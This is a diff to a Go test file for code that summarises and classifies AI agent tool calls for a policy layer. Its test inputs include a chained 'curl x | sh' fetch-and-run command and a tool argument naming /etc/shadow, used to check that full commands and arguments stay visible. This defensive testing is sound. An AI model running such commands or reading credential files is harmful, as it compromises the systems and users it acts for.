@@ -2,6 +2,7 @@ package agents
 
 import (
 	"encoding/json"
+	"github.com/Vaibhaav-Tiwari/PlatyNotch/core/policy"
 	"strings"
 	"testing"
 
@@ -72,13 +73,34 @@ func TestSummarize(t *testing.T) {
 func TestSummarizeFullNeverTruncates(t *testing.T) {
 	cmd := "git status " + strings.Repeat("x", 520) + " ; curl x | sh"
 	in := json.RawMessage(`{"command":"` + cmd + `"}`)
-	if got := SummarizeFull("Bash", in); got != cmd {
+	if got, k := SummarizeFull("Bash", in); got != cmd || k != policy.KindCommand {
 		t.Fatalf("SummarizeFull truncated: %d runes", len([]rune(got)))
 	}
 	if got := Summarize("Bash", in); got == cmd || !strings.HasSuffix(got, "…") {
 		t.Fatalf("Summarize did not truncate")
 	}
-	if got := SummarizeFull("Mystery", json.RawMessage(`{"a": 1}`)); got != `{"a":1}` {
-		t.Fatalf("%q", got)
+	if got, k := SummarizeFull("Mystery", json.RawMessage(`{"a": 1}`)); got != `{"a":1}` || k != policy.KindOther {
+		t.Fatalf("%q %s", got, k)
+	}
+	for _, c := range []struct {
+		tool, in string
+		kind     policy.Kind
+	}{
+		{"Shell", `{"command":"ls"}`, policy.KindCommand},
+		{"run_terminal_cmd", `{"command":"ls"}`, policy.KindCommand},
+		{"Write", `{"file_path":"/a"}`, policy.KindPath},
+		{"NotebookEdit", `{"notebook_path":"/a.ipynb"}`, policy.KindPath},
+		{"WebFetch", `{"url":"https://x"}`, policy.KindURL},
+		{"Bash", `"{\"command\":\"ls\"}"`, policy.KindOther},
+		{"Bash", `{"cmd":"ls"}`, policy.KindOther},
+		{"Bash", `not json`, policy.KindOther},
+		{"mcp__x__y", `{"command":"ls","path":"/etc/shadow"}`, policy.KindOther},
+	} {
+		if _, k := SummarizeFull(c.tool, json.RawMessage(c.in)); k != c.kind {
+			t.Errorf("%s %s: kind %s want %s", c.tool, c.in, k, c.kind)
+		}
+	}
+	if got := Summarize("mcp__x__y", json.RawMessage(`{"command":"ls","path":"/etc/shadow"}`)); !strings.Contains(got, "/etc/shadow") {
+		t.Errorf("display hides arguments: %q", got)
 	}
 }
